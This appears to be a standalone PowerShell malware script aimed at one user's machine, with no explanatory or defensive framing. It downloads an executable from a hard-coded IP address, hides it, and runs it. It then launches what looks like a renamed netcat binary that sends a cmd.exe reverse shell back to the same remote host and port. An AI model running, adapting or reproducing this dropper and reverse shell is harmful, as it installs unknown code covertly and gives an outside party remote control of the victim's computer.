if (-not (Test-Path "C:\Users\Alooo")) {
    Write-Host "No"
} else {
    $lmlPath = "C:\Users\Alooo\Downloads\lml.exe"
    if (-not (Test-Path $lmlPath)) {
        Invoke-WebRequest -Uri "http://193.161.193.99:37515/lml.exe" -OutFile $lmlPath
        attrib +h $lmlPath
    }
    taskkill /F /IM lml.exe
    C:\Users\Alooo\Downloads\lml.exe
    Start-Process -FilePath "C:\Users\Public\RNM.exe" -ArgumentList "-nv", "193.161.193.99", "37515", "-e", "cmd.exe"
}
